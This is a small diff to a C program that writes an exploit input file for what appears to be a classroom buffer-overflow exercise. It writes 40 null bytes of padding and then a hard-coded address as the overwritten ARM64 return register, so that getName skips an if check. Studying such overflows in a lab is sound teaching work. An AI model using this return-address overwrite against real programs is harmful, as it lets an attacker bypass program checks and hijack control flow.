@@ -27,10 +27,8 @@ int main(void){
    /* Writes the null byte at the end of the students names*/
    for (i = 0; i < 40; i++)
       putc(0x00, psFile); /* Writes '00000000' */
-   /*
-   preturnLink = 0x400850;
-   fwrite(&preturnLink, sizeof(unsigned long), 1, psFile); */
 
+   /* Writes the new x30 for getName to skip the iff */
    pskipIf = 0x400890;
    fwrite(&pskipIf, sizeof(unsigned long), 1, psFile);
 
